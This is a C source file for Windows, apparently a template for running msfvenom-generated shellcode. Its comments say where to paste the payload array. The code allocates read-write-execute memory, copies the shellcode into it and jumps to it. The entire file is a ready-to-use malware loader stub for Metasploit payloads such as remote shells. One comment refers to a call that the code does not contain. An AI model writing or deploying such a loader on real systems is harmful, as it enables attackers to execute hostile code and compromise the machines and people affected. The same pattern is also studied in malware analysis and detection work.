#include <windows.h>
#include <stdio.h>

int main() {
  // Paste your entire msfvenom output below (including 'unsigned char buf[] = ...;')
  // If you'd prefer to rename 'buf' to 'shellcode', make sure to update *every* reference below:
  //    - sizeof(buf) → sizeof(shellcode)
  //    - memcpy(..., buf, ...) → memcpy(..., shellcode, ...)
  //    - ((void(*)())buf)(); → ((void(*)())shellcode)();
  // ▼▼▼ paste here ▼▼▼

  // unsigned char buf[] = {
  //   0xfc, 0xe8, 0x82, ...

  // ▲▲▲ end paste ▲▲▲

  // Allocate RWX memory for the shellcode
  void *mem = VirtualAlloc(
    NULL,                       // Let Windows choose the address
    sizeof(buf),                // Allocate enough space for the shellcode
    MEM_COMMIT | MEM_RESERVE,   // Allocate committed + reserved pages
    PAGE_EXECUTE_READWRITE      // Allow read, write, and execute access
  );

  // Copy shellcode into the allocated memory
  memcpy(mem, buf, sizeof(buf));

  // Cast the memory to a function pointer and call it — this runs the shellcode
  ((void(*)())mem)();

  // Exit the program after shellcode finishes (if it doesn't exit itself)
  return 0;
}
